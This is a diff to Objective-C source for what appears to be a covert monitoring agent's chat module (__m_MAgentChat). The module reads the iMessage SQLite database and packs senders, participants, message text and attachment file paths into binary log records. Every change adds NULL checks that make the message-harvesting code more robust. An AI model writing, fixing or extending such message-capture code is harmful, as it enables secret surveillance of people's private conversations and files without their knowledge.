@@ -338,7 +338,7 @@ static __m_MAgentChat *sharedAgentChat = nil;
         // if msg is not from me (0), we write into peer account_login and all participants except handle_id, and into origin the handle_id
         NSMutableString *peerString=[NSMutableString stringWithCapacity:0];
         const unsigned char *peer;
-        NSString *originString;
+        NSString *originString = NULL;
         
         if (isFromMe ==1)
         {
@@ -356,12 +356,17 @@ static __m_MAgentChat *sharedAgentChat = nil;
             while(sqlite3_step(stmt3) == SQLITE_ROW)
             {
                 peer = sqlite3_column_text(stmt3,0);
-                NSString *tmpString = [NSString stringWithUTF8String:peer];
-                [peerString appendString:tmpString];
-                [peerString appendString:@","];
+                if (peer != NULL)
+                {
+                    NSString *tmpString = [NSString stringWithUTF8String:peer];
+                    [peerString appendString:tmpString];
+                    [peerString appendString:@","];
+                }
             }
-            originString = [NSString stringWithUTF8String:accountLogin];
-
+            if (accountLogin != NULL)
+            {
+                originString = [NSString stringWithUTF8String:accountLogin];
+            }
             sqlite3_finalize(stmt3);
             
             if (gIMessageContactGrabbed == NO)
@@ -392,13 +397,18 @@ static __m_MAgentChat *sharedAgentChat = nil;
 
                 if(peerId != handleId)
                 {
-                    NSString *tmpString = [NSString stringWithUTF8String:peer];
-                    [peerString appendString:tmpString];
-                    [peerString appendString:@","];
+                    if( peer != NULL)
+                    {
+                        NSString *tmpString = [NSString stringWithUTF8String:peer];
+                        [peerString appendString:tmpString];
+                        [peerString appendString:@","];
+                    }
                 }
             }
-            [peerString appendString:[NSString stringWithUTF8String:accountLogin]];
-
+            if (accountLogin != NULL)
+            {
+                [peerString appendString:[NSString stringWithUTF8String:accountLogin]];
+            }
             sqlite3_finalize(stmt3);
             
             sqlite3_stmt *stmt4 = NULL;
@@ -418,7 +428,10 @@ static __m_MAgentChat *sharedAgentChat = nil;
             while(sqlite3_step(stmt4) == SQLITE_ROW)
             {
                 peer = sqlite3_column_text(stmt4,0);
-                originString = [NSString stringWithUTF8String:peer];
+                if (peer != NULL)
+                {
+                    originString = [NSString stringWithUTF8String:peer];
+                }
             }
 
             sqlite3_finalize(stmt4);
@@ -461,7 +474,6 @@ static __m_MAgentChat *sharedAgentChat = nil;
         uint32 flags = ((isFromMe == 1)? 0 : 1);
         [logData appendBytes:&flags length:sizeof(flags)];
         
-        NSString *textString = [NSString stringWithUTF8String:text];
         // append topic/sender
         [logData appendData:[originString dataUsingEncoding:NSUTF16LittleEndianStringEncoding]];
         [logData appendBytes:&unicodeNullTerminator length:sizeof(short)];
@@ -475,7 +487,11 @@ static __m_MAgentChat *sharedAgentChat = nil;
         [logData appendData:[peerString dataUsingEncoding:NSUTF16LittleEndianStringEncoding]];
         [logData appendBytes:&unicodeNullTerminator length:sizeof(short)];
         // append content
-        [logData appendData:[textString dataUsingEncoding:NSUTF16LittleEndianStringEncoding]];
+        if (text !=NULL)
+        {
+            NSString *textString = [NSString stringWithUTF8String:text];
+            [logData appendData:[textString dataUsingEncoding:NSUTF16LittleEndianStringEncoding]];
+        }
         [logData appendBytes:&unicodeNullTerminator length:sizeof(short)];
         // append delimiter
         [logData appendBytes: &delimiter length: sizeof(delimiter)];
@@ -504,12 +520,24 @@ static __m_MAgentChat *sharedAgentChat = nil;
         while(sqlite3_step(stmt5) == SQLITE_ROW)
         {
             const unsigned char *filename= sqlite3_column_text(stmt5,0);
+            if (filename == NULL)
+                continue;
             NSString *relativePath = [NSString stringWithUTF8String:filename]; // this is a path starting with ~/
             NSString *filenameString = [relativePath stringByStandardizingPath];
+            
             const unsigned char *transfername= sqlite3_column_text(stmt5,1);
-            NSString *transfernameString = [NSString stringWithUTF8String:transfername];
+            NSString *transfernameString = NULL;
+            if (transfername != NULL)
+            {
+                transfernameString = [NSString stringWithUTF8String:transfername];
+            }
+            
             const unsigned char *mime_type= sqlite3_column_text(stmt5,2);
-            NSString *mimeString = [NSString stringWithUTF8String:mime_type];
+            NSString *mimeString = NULL;
+            if (mime_type != NULL)
+            {
+                mimeString = [NSString stringWithUTF8String:mime_type];
+            }
 #ifdef DEBUG_CHAT
             infoLog(@"mm, origin: %@", originString);
             infoLog(@"mm, peer: %@", peerString);
